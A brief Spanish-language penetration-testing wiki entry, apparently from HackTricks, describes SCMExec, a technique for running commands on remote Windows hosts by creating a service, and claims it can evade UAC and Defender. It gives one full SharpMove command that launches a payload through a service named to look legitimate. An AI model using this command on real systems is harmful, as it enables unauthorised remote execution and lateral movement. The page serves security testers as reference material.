# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** es una técnica para ejecutar comandos en sistemas remotos utilizando el Service Control Manager (SCM) para crear un servicio que ejecute el comando. Este método puede eludir algunos controles de seguridad, como el User Account Control (UAC) y Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
